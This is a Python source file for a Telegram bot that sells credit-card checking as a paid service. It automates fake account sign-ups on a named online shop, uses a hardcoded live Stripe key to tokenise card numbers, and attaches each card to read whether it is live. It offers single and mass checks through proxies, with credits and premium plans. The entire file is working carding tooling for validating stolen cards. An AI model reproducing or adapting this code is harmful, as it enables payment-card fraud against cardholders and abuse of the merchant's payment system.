import re
import json
import requests
import asyncio
from time import time
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ChatType
import random
import string
from BOT.tools.proxy import get_proxy

# Stripe Auth API Config
STRIPE_API_URL = "https://api.stripe.com/v1/payment_methods"
STRIPE_PK = "pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs"
STRIPE_ACCOUNT = "acct_1Mpulb2El1QixccJ"

user_locks = {}


class Gate:
    """Gate class for redbluechair.com Stripe Auth"""
    
    def __init__(self, proxy=None):
        self.s = requests.Session()
        self.headers = {
            'authority': 'redbluechair.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'origin': 'https://redbluechair.com',
            'referer': 'https://redbluechair.com/my-account/',
            'upgrade-insecure-requests': '1',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"'
        }
        self.s.headers.update(self.headers)
        
        # Apply proxy to session (but NOT for Stripe tokenization)
        if proxy:
            self.proxy = {'http': proxy, 'https': proxy}
            self.s.proxies = self.proxy
        else:
            self.proxy = None
    
    def rnd_str(self, l=10):
        """Generate random string"""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=l))
    
    def reg(self):
        """Register new account on redbluechair.com"""
        try:
            # Step 1: Get registration page
            r1 = self.s.get('https://redbluechair.com/my-account/', timeout=30)
            
            # Extract nonce
            nonce_match = re.search(r'name="woocommerce-register-nonce"\s+value="([^"]+)"', r1.text)
            if not nonce_match:
                return False, "Failed to get registration nonce"
            
            nonce = nonce_match.group(1)
            
            # Generate random credentials (using tempmail-like pattern)
            email = f"{self.rnd_str(10)}@temporarymail.com"
            password = self.rnd_str(12)
            
            # Step 2: Register
            data = {
                'username': self.rnd_str(10),
                'email': email,
                'password': password,
                'woocommerce-register-nonce': nonce,
                '_wp_http_referer': '/my-account/',
                'register': 'Register'
            }
            
            r2 = self.s.post('https://redbluechair.com/my-account/', data=data, timeout=30)
            
            # Check if registration was successful
            if 'Log out' in r2.text or 'log-out' in r2.text.lower():
                return True, email
            else:
                return False, "Registration failed"
                
        except Exception as e:
            return False, str(e)
    
    def tok(self, cc, mm, yy, cvv):
        """Create Stripe payment method token (NO PROXY)"""
        try:
            # Format year
            if len(yy) == 2:
                # Assume 20xx for 2-digit years
                exp_year = f"20{yy}"
            elif len(yy) == 4:
                exp_year = yy
            else:
                # Invalid year format
                return False, "Invalid year format"
            
            # Stripe tokenization headers
            stripe_headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                'Stripe-Account': STRIPE_ACCOUNT,
            }
            
            import uuid
            
            data = {
                'type': 'card',
                'card[number]': cc,
                'card[cvc]': cvv,
                'card[exp_month]': mm,
                'card[exp_year]': exp_year,
                'guid': str(uuid.uuid4()),
                'muid': str(uuid.uuid4()),
                'sid': str(uuid.uuid4()),
                'payment_user_agent': 'stripe.js/v3',
                'referrer': 'https://redbluechair.com',
                'time_on_page': str(random.randint(15000, 45000)),
                'key': STRIPE_PK,
                'pasted_fields': 'number',
            }
            
            # IMPORTANT: Create new session without proxy for Stripe API
            stripe_session = requests.Session()
            r = stripe_session.post(
                STRIPE_API_URL,
                headers=stripe_headers,
                data=data,
                timeout=30
            )
            
            result = r.json()
            
            if 'id' in result and result['id'].startswith('pm_'):
                return True, result['id']
            elif 'error' in result:
                error_msg = result['error'].get('message', 'Unknown error')
                return False, error_msg
            else:
                return False, "Failed to create token"
                
        except Exception as e:
            return False, str(e)
    
    def add(self, pm):
        """Add payment method and get response"""
        try:
            # Step 1: Get add payment method page
            r1 = self.s.get('https://redbluechair.com/my-account/add-payment-method/', timeout=30)
            
            # Try multiple nonce patterns
            nonce = None
            patterns = [
                r'"createSetupIntentNonce":"([^"]+)"',
                r'"createAndConfirmSetupIntentNonce":"([^"]+)"',
                r'"create_setup_intent_nonce":"([a-z0-9]+)"',
            ]
            
            for pattern in patterns:
                match = re.search(pattern, r1.text)
                if match:
                    nonce = match.group(1)
                    break
            
            if not nonce:
                return "Declined ❌", "Failed to get setup intent nonce"
            
            # Step 2: Create setup intent
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://redbluechair.com',
                'referer': 'https://redbluechair.com/my-account/add-payment-method/',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'x-requested-with': 'XMLHttpRequest',
            }
            
            data = {
                'action': 'wc_stripe_create_setup_intent',
                'stripe_source_id': pm,
                'nonce': nonce,
            }
            
            r2 = self.s.post(
                'https://redbluechair.com/wp-admin/admin-ajax.php',
                headers=headers,
                data=data,
                timeout=30
            )
            
            result = r2.json() if r2.text else {}
            
            # Parse response
            if isinstance(result, dict):
                if result.get('success') == True:
                    return "Approved ✅", result.get('message', 'Payment method added successfully')
                elif 'error' in result:
                    error = result['error']
                    if isinstance(error, dict):
                        message = error.get('message', str(error))
                    else:
                        message = str(error)
                    
                    # Check for approval keywords in error message
                    msg_upper = message.upper()
                    if any(kw in msg_upper for kw in ['INSUFFICIENT', 'FUNDS']):
                        return "Approved ✅", "Insufficient Funds"
                    elif any(kw in msg_upper for kw in ['CVC', 'CVV', 'SECURITY CODE']):
                        return "CCN ✅", "CVC Mismatch"
                    elif any(kw in msg_upper for kw in ['ZIP', 'POSTAL', 'ADDRESS']):
                        return "Approved ✅", "Address Mismatch"
                    elif any(kw in msg_upper for kw in ['3D', 'AUTHENTICATION', 'SECURE']):
                        return "Charged 💎", "3D Secure Required"
                    else:
                        return "Declined ❌", message[:60]
                else:
                    message = result.get('message', 'Unknown response')
                    return "Declined ❌", message[:60]
            else:
                return "Declined ❌", "Invalid response format"
                
        except Exception as e:
            return "Declined ❌", str(e)[:60]

def load_users():
    try:
        with open("DATA/users.json", "r") as f:
            return json.load(f)
    except:
        return {}

def load_allowed_groups():
    try:
        with open("DATA/groups.json", "r") as f:
            return json.load(f)
    except:
        return []

def has_credits(user_id):
    try:
        with open("DATA/users.json", "r") as f:
            users = json.load(f)
        user = users.get(str(user_id))
        if not user:
            return False
        credits = user.get("plan", {}).get("credits", 0)
        if credits == "∞":
            return True
        return int(credits) > 0
    except:
        return False

def deduct_credit(user_id):
    try:
        with open("DATA/users.json", "r") as f:
            users = json.load(f)
        user = users.get(str(user_id))
        if not user:
            return False
        credits = user["plan"].get("credits", 0)
        if credits == "∞":
            return True
        if int(credits) > 0:
            user["plan"]["credits"] = str(int(credits) - 1)
            users[str(user_id)] = user
            with open("DATA/users.json", "w") as f:
                json.dump(users, f, indent=4)
            return True
        return False
    except:
        return False

def deduct_credit_bulk(user_id, amount):
    try:
        with open("DATA/users.json", "r") as f:
            users = json.load(f)
        user = users.get(str(user_id))
        if not user:
            return False
        credits = user["plan"].get("credits", 0)
        if credits == "∞":
            return True
        credits = int(credits)
        if credits >= amount:
            user["plan"]["credits"] = str(credits - amount)
            users[str(user_id)] = user
            with open("DATA/users.json", "w") as f:
                json.dump(users, f, indent=4)
            return True
        return False
    except:
        return False

def extract_card(text):
    match = re.search(r'(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})', text)
    if match:
        return match.groups()
    return None

def extract_cards(text):
    return re.findall(r'(\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})', text)

def chunk_cards(cards, size):
    for i in range(0, len(cards), size):
        yield cards[i:i + size]

def check_stripe_auth(cc, mm, yy, cvv, proxy=None):
    """Full Stripe Auth check using Gate class"""
    try:
        gate = Gate(proxy=proxy)
        
        # Step 1: Register account
        reg_success, reg_msg = gate.reg()
        if not reg_success:
            return "Declined ❌", f"Registration failed: {reg_msg}"
        
        # Step 2: Tokenize card
        tok_success, tok_result = gate.tok(cc, mm, yy, cvv)
        if not tok_success:
            return "Declined ❌", tok_result
        
        payment_method_id = tok_result
        
        # Step 3: Add payment method
        status, response = gate.add(payment_method_id)
        
        return status, response
        
    except Exception as e:
        return "Declined ❌", str(e)[:60]

def is_free_user(user_id):
    """Check if user has free plan"""
    try:
        users = load_users()
        user = users.get(str(user_id))
        if not user:
            return True
        plan = user.get("plan", {}).get("plan", "Free")
        return plan in ["Free", "Redeem Code"]
    except:
        return True

@Client.on_message(filters.command("au") & ~filters.edited)
async def stripe_auth_single(client, message):
    """Single card Stripe Auth checker"""
    try:
        allowed_groups = load_allowed_groups()
        user_id = str(message.from_user.id)
        
        # Check if in private chat
        if message.chat.type == ChatType.PRIVATE:
            if is_free_user(user_id):
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n"
                    "<b>~ Message :</b> <code>Free users can only check in groups!</code>\n"
                    "<b>~ Get Premium to use in private</b>\n"
                    "━━━━━━━━━━━━━\n"
                    "<b>Type <code>/buy</code> to get Premium.</b>",
                    reply_to_message_id=message.id
                )
        elif message.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
            if message.chat.id not in allowed_groups:
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n"
                    "<b>~ Message :</b> <code>This Group Is Not Approved ⚠️</code>",
                )
        
        users = load_users()
        
        if user_id not in users:
            return await message.reply(
                "<pre>Access Denied 🚫</pre>\n<b>Register first using</b> <code>/register</code>",
                reply_to_message_id=message.id
            )
        
        if not has_credits(user_id):
            return await message.reply(
                "<pre>Insufficient Credits ❗️</pre>\n<b>Type /buy to get Credits.</b>",
                reply_to_message_id=message.id
            )
        
        target_text = None
        if message.reply_to_message and message.reply_to_message.text:
            target_text = message.reply_to_message.text
        elif len(message.text.split(maxsplit=1)) > 1:
            target_text = message.text.split(maxsplit=1)[1]
        
        if not target_text:
            return await message.reply(
                "<pre>CC Not Found ❌</pre>\n<b>Usage:</b> <code>/au cc|mm|yy|cvv</code>",
                reply_to_message_id=message.id
            )
        
        extracted = extract_card(target_text)
        if not extracted:
            return await message.reply(
                "<pre>Invalid Format ❌</pre>\n<b>Usage:</b> <code>/au cc|mm|yy|cvv</code>",
                reply_to_message_id=message.id
            )
        
        cc, mm, yy, cvv = extracted
        fullcc = f"{cc}|{mm}|{yy}|{cvv}"
        
        # Get user proxy
        proxy = get_proxy(message.from_user.id)
        
        start_time = time()
        
        loading_msg = await message.reply(
            f"<pre>Processing..!</pre>\n━━━━━━━━━━━━\n• <b>Card -</b> <code>{fullcc}</code>\n• <b>Gate -</b> <code>Stripe Auth (redbluechair.com)</code>",
            reply_to_message_id=message.id
        )
        
        # Run in executor to avoid blocking
        loop = asyncio.get_event_loop()
        status, response = await loop.run_in_executor(None, check_stripe_auth, cc, mm, yy, cvv, proxy)
        
        end_time = time()
        timetaken = round(end_time - start_time, 2)
        
        profile = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name}</a>"
        
        user_data = users.get(user_id, {})
        plan = user_data.get("plan", {}).get("plan", "Free")
        badge = user_data.get("plan", {}).get("badge", "🎟️")
        
        final_msg = f"""<b>[#StripeAuth] | Sos</b> ✦
━━━━━━━━━━━━━━━
<b>💳 Card:</b> <code>{fullcc}</code>
<b>📊 Status:</b> <code>{status}</code>
<b>💬 Response:</b> <code>{response}</code>
<b>⏱️ Time:</b> <code>{timetaken}s</code>
<b>🌐 Gateway:</b> <code>Stripe Auth (redbluechair.com)</code>
━━━━━━━━━━━━━━━
<b>[ﾒ] Checked By</b>: {profile} [<code>{plan} {badge}</code>]"""
        
        buttons = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("Support", url="https://t.me/SoskeUI"),
            ]
        ])
        
        await loading_msg.edit(final_msg, reply_markup=buttons, disable_web_page_preview=True)
        
        deduct_credit(user_id)
    
    except Exception as e:
        await message.reply(f"<code>Error: {str(e)[:50]}</code>", reply_to_message_id=message.id)


@Client.on_message(filters.command("mau") & ~filters.edited)
async def stripe_auth_mass(client, message):
    """Mass Stripe Auth checker"""
    user_id = str(message.from_user.id)
    
    if not message.from_user:
        return await message.reply("❌ Cannot process this message.")
    
    if user_id in user_locks:
        return await message.reply(
            "<pre>⚠️ Wait!</pre>\n<b>Your previous /mau is still processing.</b>",
            reply_to_message_id=message.id
        )
    
    user_locks[user_id] = True
    
    try:
        users = load_users()
        allowed_groups = load_allowed_groups()
        
        # Check if in private chat
        if message.chat.type == ChatType.PRIVATE:
            if is_free_user(user_id):
                user_locks.pop(user_id, None)
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n"
                    "<b>~ Message :</b> <code>Free users can only check in groups!</code>\n"
                    "<b>~ Get Premium to use in private</b>\n"
                    "━━━━━━━━━━━━━\n"
                    "<b>Type <code>/buy</code> to get Premium.</b>",
                    reply_to_message_id=message.id
                )
        elif message.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
            if message.chat.id not in allowed_groups:
                user_locks.pop(user_id, None)
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n<b>This Group Is Not Approved ⚠️</b>",
                    reply_to_message_id=message.id
                )
        
        if user_id not in users:
            user_locks.pop(user_id, None)
            return await message.reply(
                "<pre>Access Denied 🚫</pre>\n<b>Register first using</b> <code>/register</code>",
                reply_to_message_id=message.id
            )
        
        user_data = users[user_id]
        plan_info = user_data.get("plan", {})
        mlimit = plan_info.get("mlimit", 10)
        plan = plan_info.get("plan", "Free")
        badge = plan_info.get("badge", "🎟️")
        
        if mlimit is None or str(mlimit).lower() in ["null", "none"]:
            mlimit = 10000
        else:
            mlimit = int(mlimit)
        
        target_text = None
        if message.reply_to_message and message.reply_to_message.text:
            target_text = message.reply_to_message.text
        elif len(message.text.split(maxsplit=1)) > 1:
            target_text = message.text.split(maxsplit=1)[1]
        
        if not target_text:
            user_locks.pop(user_id, None)
            return await message.reply(
                "❌ Send cards!\nFormat: <code>4111111111111111|12|25|123</code>",
                reply_to_message_id=message.id
            )
        
        all_cards = extract_cards(target_text)
        if not all_cards:
            user_locks.pop(user_id, None)
            return await message.reply("❌ No valid cards found!", reply_to_message_id=message.id)
        
        # Handle cards exceeding limit with button option
        if len(all_cards) > mlimit:
            user_locks.pop(user_id, None)
            
            # Create button to continue with limit
            from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
            
            buttons = InlineKeyboardMarkup([
                [InlineKeyboardButton(
                    f"Continue with {mlimit} cards ✅", 
                    callback_data=f"mau_limit|{user_id}|{mlimit}"
                )],
                [InlineKeyboardButton("Cancel ❌", callback_data="mau_cancel")]
            ])
            
            # Store cards temporarily for callback
            import json
            temp_file = f"downloads/temp_cards_{user_id}.json"
            import os
            os.makedirs("downloads", exist_ok=True)
            with open(temp_file, "w") as f:
                json.dump(all_cards[:mlimit], f)
            
            return await message.reply(
                f"⚠️ <b>Card Limit Exceeded</b>\n\n"
                f"<b>Your plan allows:</b> <code>{mlimit} cards</code>\n"
                f"<b>You sent:</b> <code>{len(all_cards)} cards</code>\n\n"
                f"Click below to check first {mlimit} cards:",
                reply_to_message_id=message.id,
                reply_markup=buttons
            )
        
        available_credits = user_data.get("plan", {}).get("credits", 0)
        card_count = len(all_cards)
        
        if available_credits != "∞":
            try:
                if card_count > int(available_credits):
                    user_locks.pop(user_id, None)
                    return await message.reply(
                        "<pre>Insufficient Credits ❗️</pre>\n<b>Type /buy to get Credits.</b>",
                        reply_to_message_id=message.id
                    )
            except:
                pass
        
        checked_by = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name}</a>"
        
        # Get user proxy
        proxy = get_proxy(message.from_user.id)
        
        loader_msg = await message.reply(
            f"<pre>✦ [$mau] | M-Stripe Auth</pre>\n"
            f"<b>[⚬] Gateway:</b> <b>Stripe Auth (redbluechair.com)</b>\n"
            f"<b>[⚬] Cards:</b> <code>{card_count}</code>\n"
            f"<b>[⚬] Status:</b> <code>Processing...</code>",
            reply_to_message_id=message.id
        )
        
        start_time = time()
        final_results = []
        loop = asyncio.get_event_loop()
        
        for card in all_cards:
            parts = card.split("|")
            if len(parts) == 4:
                cc, mm, yy, cvv = parts
                status, response = await loop.run_in_executor(None, check_stripe_auth, cc, mm, yy, cvv, proxy)
                
                final_results.append(
                    f"• <b>Card:</b> <code>{card}</code>\n"
                    f"• <b>Status:</b> <code>{status}</code>\n"
                    f"• <b>Response:</b> <code>{response}</code>\n"
                    "━━━━━━━━━━━━"
                )
                
                try:
                    await loader_msg.edit(
                        f"<pre>✦ [$mau] | M-Stripe Auth</pre>\n"
                        + "\n".join(final_results[-8:]) + "\n"
                        f"<b>[⚬] Progress:</b> <code>{len(final_results)}/{card_count}</code>\n"
                        f"<b>[⚬] Checked By:</b> {checked_by}",
                        disable_web_page_preview=True
                    )
                except:
                    pass
        
        end_time = time()
        timetaken = round(end_time - start_time, 2)
        
        if available_credits != "∞":
            deduct_credit_bulk(user_id, card_count)
        
        # Show all results, not just last 10
        final_text = f"<pre>✦ [$mau] | M-Stripe Auth</pre>\n"
        final_text += "\n".join(final_results) + "\n"
        final_text += f"<b>[⚬] T/t:</b> <code>{timetaken}s</code>\n"
        final_text += f"<b>[⚬] Total:</b> <code>{card_count} cards</code>\n"
        final_text += f"<b>[⚬] Checked By:</b> {checked_by} [<code>{plan} {badge}</code>]"
        
        # If message is too long, send as file
        if len(final_text) > 4000:
            import os
            os.makedirs("downloads", exist_ok=True)
            filename = f"downloads/mau_results_{user_id}.txt"
            
            with open(filename, "w") as f:
                f.write("Mass Stripe Auth Results\n")
                f.write("=" * 50 + "\n\n")
                for result in final_results:
                    # Remove HTML tags for file
                    clean_result = result.replace("<b>", "").replace("</b>", "").replace("<code>", "").replace("</code>", "")
                    f.write(clean_result + "\n")
                f.write("\n" + "=" * 50 + "\n")
                f.write(f"Time taken: {timetaken}s\n")
                f.write(f"Total cards: {card_count}\n")
            
            await message.reply_document(
                filename,
                caption=f"<pre>✦ [$mau] | M-Stripe Auth Results</pre>\n"
                        f"<b>[⚬] Total:</b> <code>{card_count} cards</code>\n"
                        f"<b>[⚬] T/t:</b> <code>{timetaken}s</code>\n"
                        f"<b>[⚬] Checked By:</b> {checked_by} [<code>{plan} {badge}</code>]",
                reply_to_message_id=message.id
            )
            await loader_msg.delete()
            os.remove(filename)
        else:
            await loader_msg.edit(
                final_text,
                disable_web_page_preview=True
            )
    
    except Exception as e:
        await message.reply(f"⚠️ Error: {str(e)[:50]}", reply_to_message_id=message.id)
    
    finally:
        user_locks.pop(user_id, None)


@Client.on_callback_query(filters.regex(r"^mau_limit\|"))
async def mau_limit_callback(client, callback):
    """Handle mass auth with limit"""
    try:
        _, user_id, mlimit = callback.data.split("|")
        user_id = str(user_id)
        mlimit = int(mlimit)
        
        # Check if callback user matches the one who initiated
        if str(callback.from_user.id) != user_id:
            return await callback.answer("❌ This is not your request!", show_alert=True)
        
        if user_id in user_locks:
            return await callback.answer("⚠️ Already processing!", show_alert=True)
        
        user_locks[user_id] = True
        
        # Load stored cards
        import json
        import os
        temp_file = f"downloads/temp_cards_{user_id}.json"
        
        if not os.path.exists(temp_file):
            user_locks.pop(user_id, None)
            return await callback.answer("❌ Cards expired, try again!", show_alert=True)
        
        with open(temp_file, "r") as f:
            all_cards = json.load(f)
        
        os.remove(temp_file)
        
        users = load_users()
        user_data = users.get(user_id, {})
        plan = user_data.get("plan", {}).get("plan", "Free")
        badge = user_data.get("plan", {}).get("badge", "🎟️")
        available_credits = user_data.get("plan", {}).get("credits", 0)
        
        card_count = len(all_cards)
        
        if available_credits != "∞":
            try:
                if card_count > int(available_credits):
                    user_locks.pop(user_id, None)
                    return await callback.message.edit_text(
                        "<pre>Insufficient Credits ❗️</pre>\n<b>Type /buy to get Credits.</b>"
                    )
            except:
                pass
        
        checked_by = f"<a href='tg://user?id={user_id}'>{callback.from_user.first_name}</a>"
        
        # Get user proxy
        proxy = get_proxy(int(user_id))
        
        await callback.message.edit_text(
            f"<pre>✦ [$mau] | M-Stripe Auth</pre>\n"
            f"<b>[⚬] Gateway:</b> <b>Stripe Auth (redbluechair.com)</b>\n"
            f"<b>[⚬] Cards:</b> <code>{card_count}</code>\n"
            f"<b>[⚬] Status:</b> <code>Processing...</code>"
        )
        
        from time import time
        import asyncio
        start_time = time()
        final_results = []
        loop = asyncio.get_event_loop()
        
        for card in all_cards:
            parts = card.split("|")
            if len(parts) == 4:
                cc, mm, yy, cvv = parts
                status, response = await loop.run_in_executor(None, check_stripe_auth, cc, mm, yy, cvv, proxy)
                
                final_results.append(
                    f"• <b>Card:</b> <code>{card}</code>\n"
                    f"• <b>Status:</b> <code>{status}</code>\n"
                    f"• <b>Response:</b> <code>{response}</code>\n"
                    "━━━━━━━━━━━━"
                )
                
                try:
                    await callback.message.edit_text(
                        f"<pre>✦ [$mau] | M-Stripe Auth</pre>\n"
                        + "\n".join(final_results[-8:]) + "\n"
                        f"<b>[⚬] Progress:</b> <code>{len(final_results)}/{card_count}</code>\n"
                        f"<b>[⚬] Checked By:</b> {checked_by}",
                        disable_web_page_preview=True
                    )
                except:
                    pass
        
        end_time = time()
        timetaken = round(end_time - start_time, 2)
        
        if available_credits != "∞":
            deduct_credit_bulk(user_id, card_count)
        
        # Show all results
        final_text = f"<pre>✦ [$mau] | M-Stripe Auth</pre>\n"
        final_text += "\n".join(final_results) + "\n"
        final_text += f"<b>[⚬] T/t:</b> <code>{timetaken}s</code>\n"
        final_text += f"<b>[⚬] Total:</b> <code>{card_count} cards</code>\n"
        final_text += f"<b>[⚬] Checked By:</b> {checked_by} [<code>{plan} {badge}</code>]"
        
        if len(final_text) > 4000:
            os.makedirs("downloads", exist_ok=True)
            filename = f"downloads/mau_results_{user_id}.txt"
            
            with open(filename, "w") as f:
                f.write("Mass Stripe Auth Results\n")
                f.write("=" * 50 + "\n\n")
                for result in final_results:
                    clean_result = result.replace("<b>", "").replace("</b>", "").replace("<code>", "").replace("</code>", "")
                    f.write(clean_result + "\n")
                f.write("\n" + "=" * 50 + "\n")
                f.write(f"Time taken: {timetaken}s\n")
                f.write(f"Total cards: {card_count}\n")
            
            await callback.message.reply_document(
                filename,
                caption=f"<pre>✦ [$mau] | M-Stripe Auth Results</pre>\n"
                        f"<b>[⚬] Total:</b> <code>{card_count} cards</code>\n"
                        f"<b>[⚬] T/t:</b> <code>{timetaken}s</code>\n"
                        f"<b>[⚬] Checked By:</b> {checked_by} [<code>{plan} {badge}</code>]"
            )
            await callback.message.delete()
            os.remove(filename)
        else:
            await callback.message.edit_text(final_text, disable_web_page_preview=True)
        
        await callback.answer("✅ Completed!")
        
    except Exception as e:
        await callback.answer(f"❌ Error: {str(e)[:50]}", show_alert=True)
    finally:
        user_locks.pop(user_id, None)


@Client.on_callback_query(filters.regex(r"^mau_cancel$"))
async def mau_cancel_callback(client, callback):
    """Cancel mass auth"""
    await callback.message.edit_text("❌ <b>Cancelled</b>")
    await callback.answer("Cancelled")
